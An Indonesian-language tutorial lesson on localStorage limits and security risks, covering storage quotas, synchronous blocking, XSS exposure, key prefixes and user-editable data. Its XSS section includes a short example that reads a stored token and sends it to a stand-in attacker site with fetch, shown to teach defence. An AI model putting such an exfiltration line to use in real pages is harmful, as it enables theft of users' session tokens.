# 08. Keamanan dan Keterbatasan localStorage

Meskipun `localStorage` sangat berguna dan mudah dipakai, ada beberapa **keterbatasan** dan **risiko keamanan** yang **wajib** dipahami sebelum menggunakannya di aplikasi nyata.

## 1. Keterbatasan Kapasitas

`localStorage` biasanya dibatasi sekitar **5-10MB per domain** (tergantung browser). Ini terdengar besar, tapi jika aplikasi menyimpan **terlalu banyak data** (misalnya ribuan record atau gambar dalam bentuk base64), batas ini bisa cepat tercapai.

```javascript
try {
  localStorage.setItem("dataBesar", "x".repeat(10 * 1024 * 1024)); // coba simpan 10MB
} catch (error) {
  console.error("Gagal menyimpan:", error.message);
  // Error: "QuotaExceededError" jika melebihi batas
}
```

👉 **Tips:** Selalu bungkus operasi `setItem()` dengan `try...catch` untuk menangani kemungkinan **penuh (quota exceeded)**.

## 2. Hanya Menyimpan String (Sudah Dibahas)

Seperti dibahas di materi 02 & 03, `localStorage` **hanya menyimpan string**, sehingga kita **wajib** menggunakan `JSON.stringify()`/`JSON.parse()` untuk data kompleks. Ini bukan celah keamanan, tapi keterbatasan teknis yang sering menyebabkan bug bagi pemula yang lupa melakukannya.

## 3. Operasi Bersifat Synchronous (Blocking)

Semua operasi `localStorage` berjalan **synchronous** — artinya kode JavaScript **berhenti sejenak** menunggu operasi baca/tulis selesai, sebelum melanjutkan baris berikutnya. Untuk data kecil ini tidak masalah, tapi untuk **data besar**, ini bisa membuat halaman terasa "macet" sesaat.

👉 Untuk aplikasi yang butuh menyimpan data besar secara efisien, pertimbangkan **IndexedDB** (API penyimpanan browser yang lebih canggih dan asynchronous) — namun ini di luar cakupan modul dasar ini.

## 4. ⚠️ RISIKO KEAMANAN: Rentan terhadap XSS (Cross-Site Scripting)

Ini adalah **poin keamanan paling penting** yang wajib dipahami:

**`localStorage` bisa diakses oleh SEMUA JavaScript yang berjalan di halaman tersebut** — termasuk skrip pihak ketiga (misalnya dari library/CDN yang disusupi) atau skrip berbahaya yang berhasil disisipkan lewat celah **XSS**.

```javascript
// Jika ada celah XSS di aplikasi, penyerang bisa menjalankan kode seperti ini:
const dataCuriannya = localStorage.getItem("token");
fetch("https://situs-jahat.com/curi?data=" + dataCuriannya); // data berhasil dicuri!
```

### ❌ JANGAN Simpan Data Sensitif di localStorage

Sebaiknya **hindari** menyimpan hal-hal berikut secara langsung di `localStorage`:

- **Token autentikasi** (JWT, session token) — terutama untuk aplikasi dengan data sensitif
- **Password** (dalam bentuk apapun, bahkan yang di-hash sekalipun)
- **Data kartu kredit / informasi finansial**
- **Data pribadi sensitif** lainnya (NIK, data medis, dll)

### ✅ Alternatif yang Lebih Aman untuk Data Sensitif

- Gunakan **cookies dengan atribut `httpOnly`** untuk token/session (tidak bisa diakses JavaScript sama sekali, sehingga aman dari XSS)
- Simpan data sensitif di **server**, bukan di client
- Jika terpaksa menyimpan token di client, gunakan token dengan **masa berlaku singkat (short-lived)** dan mekanisme refresh yang aman

## 5. localStorage Bersifat Per-Origin, Bukan Per-Aplikasi

`localStorage` dibagikan oleh **semua halaman** dengan domain, protokol, dan port yang **sama persis**. Jika kamu mengembangkan beberapa aplikasi di domain yang sama (misalnya `myapp.com/app1` dan `myapp.com/app2`), keduanya akan **berbagi localStorage yang sama** — jadi hati-hati terhadap **konflik nama key**.

👉 **Tips:** Gunakan **prefix** pada key untuk menghindari konflik, misalnya:

```javascript
localStorage.setItem("todoApp_daftarTugas", JSON.stringify(tugas));
localStorage.setItem("todoApp_tema", "gelap");
```

## 6. Data localStorage Bisa Diedit Manual oleh User

User bisa dengan mudah membuka **DevTools → Application → Local Storage** dan **mengedit data secara manual**. Jangan pernah **mempercayai** data dari `localStorage` sepenuhnya untuk hal-hal krusial (misalnya validasi harga di aplikasi e-commerce) — validasi penting **harus** tetap dilakukan di **server**.

## Ringkasan: Aturan Emas Menggunakan localStorage

| Aturan | Alasan |
|---|---|
| ❌ Jangan simpan data sensitif (token, password) | Rentan dicuri lewat XSS |
| ✅ Gunakan `try...catch` saat `setItem()` | Berjaga-jaga jika kapasitas penuh |
| ✅ Gunakan prefix pada key | Menghindari konflik antar aplikasi di domain sama |
| ❌ Jangan percaya penuh data dari localStorage untuk validasi krusial | User bisa mengedit manual |
| ✅ Gunakan `JSON.parse()` dengan `try...catch` | Data mungkin rusak/tidak valid |

Buka `contoh.html` untuk melihat contoh penanganan error dan praktik keamanan dasar.

➡️ Lanjut ke materi berikutnya: **09. Rangkuman dan Best Practice localStorage**
